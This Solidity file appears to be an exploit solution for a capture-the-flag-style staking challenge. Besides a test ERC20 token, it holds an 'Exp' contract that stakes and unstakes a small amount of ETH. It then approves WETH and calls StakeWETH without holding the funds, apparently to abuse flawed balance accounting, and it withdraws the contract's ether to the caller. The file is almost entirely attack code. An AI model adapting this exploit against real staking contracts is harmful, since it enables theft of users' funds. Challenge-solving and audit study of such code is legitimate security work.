// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/token/ERC20/ERC20.sol";
import "../src/Stake.sol";


contract TestCoin is ERC20 {
    constructor() ERC20("TestCoin", "0x0") {
        uint INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
        _mint(address(0xa0Ee7A142d267C1f36714E4a8F75612F20a79720), INITIAL_SUPPLY);

    }
}


contract Exp {

    Stake stake;
    address weth;
    constructor(address _stake) payable{
        require(msg.value >= 0.0011 ether+1, "Not enough eth sent");
        stake = Stake(_stake);
        stake.StakeETH{value: 0.0011 ether+1}();
        stake.Unstake(0.0011 ether);
    }
    function attack() public {
        weth = stake.WETH();
        ERC20(weth).approve(address(stake), 1 ether);
        stake.StakeWETH(0.5 ether);
    }

    function withdraw() public payable {
        payable(msg.sender).transfer(address(this).balance);
    }

}